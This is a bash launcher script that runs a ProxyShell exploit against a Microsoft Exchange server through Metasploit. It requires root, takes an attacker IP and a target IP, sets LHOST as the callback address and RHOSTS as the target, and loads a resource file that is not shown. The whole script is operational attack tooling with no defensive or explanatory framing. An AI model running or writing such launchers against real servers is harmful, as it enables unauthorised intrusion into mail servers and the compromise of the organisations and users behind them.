#!/bin/bash

# Function to display usage
usage() {
    echo -e "\nSyntax: proxyshell.sh <local IP> <Exchange Server IP>"
    echo "Example: ./proxyshell.sh 10.10.10.10 10.10.10.20\n"
}

# Check for root privileges
if [ "$(id -u)" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

# Check if the required number of arguments was provided
if [ $# -ne 2 ]; then
    usage
    exit 1
fi

LOCAL_IP="$1"
EXCHANGE_SERVER_IP="$2"

# Check for required tools (msfdb and msfconsole)
if ! command -v msfdb &> /dev/null || ! command -v msfconsole &> /dev/null; then
    echo "Error: Metasploit tools not found."
    exit 1
fi

# Check if MSF script file exists
MSF_SCRIPT="./msfscripts/proxyshell.rc"
if [ ! -f "$MSF_SCRIPT" ]; then
    echo "Error: MSF script file $MSF_SCRIPT not found."
    exit 1
fi

echo "Starting Metasploit Database"
msfdb start

echo "Starting Metasploit Console and executing ProxyShell script"
msfconsole -q -x "setg LHOST $LOCAL_IP; setg RHOSTS $EXCHANGE_SERVER_IP; resource $MSF_SCRIPT"


